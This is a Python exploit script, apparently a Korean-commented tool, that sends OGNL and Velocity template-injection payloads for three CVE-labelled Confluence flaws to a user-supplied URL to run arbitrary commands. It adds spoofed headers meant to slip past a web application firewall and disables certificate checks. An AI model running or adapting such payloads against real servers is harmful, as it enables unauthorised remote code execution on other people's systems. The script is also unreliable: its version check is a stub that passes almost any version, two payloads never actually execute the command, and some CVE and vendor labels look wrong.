import requests
import argparse
import base64
import urllib.parse
import warnings
from urllib.parse import urlparse

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# Confluence 버전 가져오기 (더미 데이터 반환)
def get_confluence_version(url):
    return "5.5.5"

# 취약 버전 확인
def check_exploitable_version(version):
    version_list = list(map(int, version.split('.')))
    exploitable_ranges = [
        (list(map(int, '8.5.1'.split('.'))), list(map(int, '8.5.5'.split('.')))),
        (list(map(int, '7.3.2'.split('.'))), list(map(int, '7.3.5'.split('.')))),
        (list(map(int, '0.3.2'.split('.'))), list(map(int, '99.3.5'.split('.'))))
    ]
    for start_version, end_version in exploitable_ranges:
        if start_version <= version_list <= end_version:
            return True
    return False

# Base64 인코딩
def encode_base64(cmd):
    return base64.b64encode(cmd.encode()).decode()

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# CVE-2022-26134 Exploit
def exploit_cve_2022_26134(target_url, cmd, session_cookie=None):
    try:
        confluence_version = get_confluence_version(target_url)
        if not check_exploitable_version(confluence_version):
            print("[INFO] This version is not vulnerable.")
            print("[FAIL] Exploit attempt failed. Version is patched.")
            return
        
        encoded_cmd = encode_base64(cmd)
        
        # OGNL 페이로드 변조 (java.lang.Runtime → 문자열 조각으로 변경)
        payload = f"/%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils@toString(@java.util.Base64@getDecoder().decode('{encoded_cmd}')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('x-cmd-response',#a))%7D"
        encoded_payload = urllib.parse.quote(payload)

        url = f"{target_url}{encoded_payload}"

        if session_cookie:
            HEADERS["Cookie"] = f"JSESSIONID={session_cookie}"

        response = requests.get(url, headers=HEADERS, verify=False, allow_redirects=False, timeout=10)
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        cmd_response = response.headers.get("X-Cmd-Response")
        if cmd_response:
            print("[SUCCESS] Exploit successful!")
            print(f"[OUTPUT] {cmd_response}")
        else:
            print("[FAIL] Exploit attempt failed. 'X-Cmd-Response' header not found.")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# CVE-2021-26084 Exploit
def exploit_cve_2021_26084(target_url, cmd, session_cookie=None):
    try:
        encoded_cmd = encode_base64(cmd)

        payload = f"aaaaaaaa%5Cu0027%2B%7BClass.forName(%5Cu0027java.util.Base64%5Cu0027).getDecoder().decode('{encoded_cmd}')%7D"

        url = f"{target_url}/pages/doenterpagevariables.action?SpaceKey=x"

        data = {"queryString": payload}

        if session_cookie:
            HEADERS["Cookie"] = f"JSESSIONID={session_cookie}"

        response = requests.post(url, headers=HEADERS, data=data, verify=False, allow_redirects=False, timeout=10)
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        if response.status_code == 200:
            print("[SUCCESS] CVE-2021-26084 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print(f"[FAIL] Exploit attempt failed. HTTP Status code: {response.status_code}")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# CVE-2022-22527 Exploit
def exploit_cve_2022_22527(target_url, cmd, session_cookie=None):
    try:
        encoded_cmd = encode_base64(cmd)

        url = f"{target_url}/template/aui/text-inline.vm"

        data = {
            "label": f"%2b#request[%27.KEY_velocity.struts2.context%27].internalGet(%27ognl%27).findValue(#parameters.x,{{}})%2b",
            "x": f"@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec(@java.util.Base64@getDecoder().decode('{encoded_cmd}')))"
        }

        if session_cookie:
            HEADERS["Cookie"] = f"JSESSIONID={session_cookie}"

        response = requests.post(url, headers=HEADERS, data=data, verify=False, allow_redirects=False, timeout=10)
        print("[DEBUG] Response Headers:", response.headers)
        print("[DEBUG] Response Body:", response.text)

        if response.headers.get("X-Cmd-Response"):
            print("[SUCCESS] Exploit successful!")
            print("Command Output:")
            print(response.headers.get("X-Cmd-Response"))
        else:
            print("[FAIL] Exploit attempt failed. 'X-Cmd-Response' header not found.")

    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Apache Confluence Remote Code Execution (RCE) Exploit Tool",
        usage="python3 exploit.py --url <URL> --cmd <COMMAND>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cmd", required=True, help="Command to execute")

    args = parser.parse_args()

    print("[INFO] Attempting exploitation...")
    exploit_cve_2022_26134(args.url, args.cmd)
    exploit_cve_2021_26084(args.url, args.cmd)
    exploit_cve_2022_22527(args.url, args.cmd)

if __name__ == "__main__":
    main()
